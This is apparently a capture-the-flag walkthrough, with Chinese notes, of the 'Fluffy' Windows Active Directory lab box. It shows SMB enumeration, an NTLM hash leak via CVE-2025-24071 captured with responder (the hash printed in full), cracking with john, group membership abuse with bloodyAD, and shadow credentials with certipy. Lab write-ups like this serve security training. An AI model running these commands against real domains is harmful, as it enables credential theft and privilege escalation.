## Machine Information
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
## attack
nmap端口扫描

![](attachments/Pasted%20image%2020250906125355.png)

配置hosts文件,尝试登录

```SHELL
evil-winrm -u j.fleischman -p J0elTHEM4n1990! -i 10.10.11.69
```

无法登录,smb枚举目录
```SHELL
crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --share
```
![](attachments/Pasted%20image%2020250906130655.png)

SMB枚举用户

```SHELL
crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --rid-brute
```

![](attachments/Pasted%20image%2020250906131052.png)

查看IT部门文件
```shell
smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
```

![](attachments/Pasted%20image%2020250906150609.png)

pdf提示了一些CVE编号

使用CVE-2025-24071[0x6rss/CVE-2025-24071_PoC: CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File](https://github.com/0x6rss/CVE-2025-24071_PoC)
responder抓取NTLM HASH

![](attachments/Pasted%20image%2020250906163723.png)

```
p.agila::FLUFFY:2e389d9803b7cdde:C511A65FED5D202381EED81633E9B5D6:010100000000000080281829E71EDC016ABC2FA6E10E91E00000000002000800550049005200340001001E00570049004E002D0047004100450043004B0053005700510052003400480004003400570049004E002D0047004100450043004B005300570051005200340048002E0055004900520034002E004C004F00430041004C000300140055004900520034002E004C004F00430041004C000500140055004900520034002E004C004F00430041004C000700080080281829E71EDC010600040002000000080030003000000000000000010000000020000000E0E99D84AD756A6B9F360C4AB4DFFBD3BFE59A13C086FE871DBB0F6A9A9DD40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
```

john爆破
![](attachments/Pasted%20image%2020250906165239.png)

经过bloodhound分析后将`p.agila`添加到组`SERVICE ACCOUNTS`中 对 `ca_svc`、`ldap_svc`、`winrm_svc` 等账户有 `GenericWrite` 权限

```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila 
```

![](attachments/Pasted%20image%2020250907104912.png)添加影子证书

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'  
```

![](attachments/Pasted%20image%2020250907105143.png)